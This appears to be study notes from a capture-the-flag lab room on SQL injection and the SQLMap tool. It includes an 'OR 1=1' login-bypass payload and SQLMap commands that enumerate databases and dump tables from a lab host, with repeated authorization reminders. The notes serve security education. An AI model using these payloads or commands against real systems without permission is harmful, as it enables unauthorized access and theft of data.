## SQLMap

---

### Overview

SQL injection (SQLi) is a common and dangerous web vulnerability where unsanitized user input alters SQL queries executed by the back-end DBMS. SQLMap is an automated, command-line tool that helps detect and exploit SQLi vulnerabilities across many DBMS types (MySQL, PostgreSQL, MSSQL, SQLite, etc.).

> **Note:** Only test systems you own or have explicit permission to test.

---

### What is a database and how web apps use it

* A **database** stores structured application data (users, products, posts).
* Web apps interact with DBMSs via **SQL** queries (e.g., `SELECT`, `INSERT`).
* Input fields (login, search) often form parts of those SQL queries — if unvalidated, they can be manipulated.

---

### Simple login example (conceptual)

Original safe query (example):

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'Un@detectable444';
```

Attacker input (injection):

```
Password: abc' OR 1=1;-- -
```

Resulting query becomes:

```sql
SELECT * FROM users WHERE username = 'John' AND password = 'abc' OR 1=1;-- -';
```

Because `OR 1=1` is always true, the WHERE clause can evaluate as true and bypass authentication.

---

### Types of SQLi (brief)

* **Boolean-based (blind)** — infer data using true/false responses.
* **Time-based (blind)** — infer data by causing DB delays (e.g., `SLEEP()`).
* **Error-based** — force DB errors that leak data.
* **UNION-based** — inject `UNION SELECT` to retrieve results.

---

### SQLMap: Quick introduction

* Run `sqlmap --help` to see flags.
* For guided usage, use the wizard: `sqlmap --wizard`.

Wizard example:

```bash
sqlmap --wizard
```

It will prompt for the full URL (`-u`) and guide through options.

---

### Common SQLMap workflow & flags

1. **Scan a GET URL:**

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1"
```

2. **Extract all databases:**

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" --dbs
```

3. **List tables of a database:**

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users --tables
```

4. **Dump a specific table:**

```bash
sqlmap -u "http://sqlmaptesting.thm/search/cat=1" -D users -T thomas --dump
```

5. **Use an intercepted POST request saved to a file:**

```bash
sqlmap -r intercepted_request.txt
```

---

### Interpreting SQLMap output (high-level)

* SQLMap reports **injection point(s)** and **payloads** used; e.g., boolean-based, error-based, time-based, UNION.
* It will often identify the **back-end DBMS** (e.g., `MySQL >= 5.1`), web server OS, and web technologies.
* After identifying injection, use `--dbs`, `-D`, `--tables`, and `--dump` to enumerate.

---

### Example (condensed output style)

```
Parameter: cat (GET)
  Type: boolean-based blind
  Payload: cat=1 AND 2175=2175

Available databases [2]:
  * users
  * members
```

---

### Safety, ethics, and tips

* **Always** have explicit authorization to test a target.
* Use the `--level` and `--risk` flags to tune aggressiveness.
* Save sessions and resume scans with `--batch` or by using SQLMap's session files.
* Be mindful of rate limits and noisy payloads (WAF/IDS may flag you).

---

### Quick reference (cheat-sheet)

* Wizard: `sqlmap --wizard`
* Test URL: `sqlmap -u <url>`
* Databases: `--dbs`
* Tables: `-D <db> --tables`
* Dump rows: `-D <db> -T <table> --dump`
* Intercepted request: `-r <file>`

---

### Short Q&A (from room)

* **Which flag extracts all databases?** `--dbs`
* **Full command to extract all tables from `members` (vulnerable URL `http://sqlmaptesting.thm/search/cat=1`):**

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
```

---

### Further reading / next steps

* Practice on intentionally vulnerable labs (e.g., OWASP Juice Shop, DVWA) or your lab environment.
* Learn to capture and sanitize HTTP requests (Burp Suite, browser devtools) for `-r` usage.
* Study manual SQLi techniques to understand what SQLMap automates.

